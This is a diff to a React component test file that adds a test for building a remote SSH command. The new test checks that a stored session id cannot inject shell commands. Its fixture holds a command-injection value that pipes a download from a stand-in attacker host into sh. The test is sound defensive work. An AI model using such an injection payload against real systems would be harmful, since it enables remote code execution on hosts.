@@ -14,6 +14,7 @@ const state = vi.hoisted(() => ({
   create: vi.fn(),
   trustFolder: vi.fn(),
   windowData: {} as Record<string, string>,
+  terminalArgs: [] as string[],
 }));
 
 vi.mock("@/components/canvas/window-manager", () => ({
@@ -40,7 +41,10 @@ vi.mock("@/components/claude-sessions/claude-sessions-store", () => ({
   useClaudeSessionsLoaded: () => true,
 }));
 vi.mock("@/components/terminal-widget", () => ({
-  TerminalWidget: () => <div>terminal</div>,
+  TerminalWidget: ({ args }: { args?: string[] }) => {
+    state.terminalArgs = args ?? [];
+    return <div>terminal</div>;
+  },
 }));
 
 const { ClaudeCode } = await import("./-claude-code");
@@ -116,5 +120,22 @@ describe("Claude window", () => {
     render(<ClaudeCode />);
 
     await waitFor(() => expect(lastBoardOf("k9")).toBe("ws1"));
+  });
+});
+
+describe("Claude on an SSH host", () => {
+  it("never puts a stored session id that isn't a UUID into the remote command", () => {
+    // Window data lives in localStorage; the id is spliced into a shell command run on the host.
+    state.windowData = {
+      projectPath: "/srv/app",
+      projectName: "app",
+      projectSshHost: "box",
+      claudeSessionId: "x'; curl evil.example | sh; echo '",
+    };
+    render(<ClaudeCode />);
+
+    const remote = state.terminalArgs.join(" ");
+    expect(remote).not.toContain("evil.example");
+    expect(remote).toMatch(/--session-id [0-9a-f-]{36}/);
   });
 });
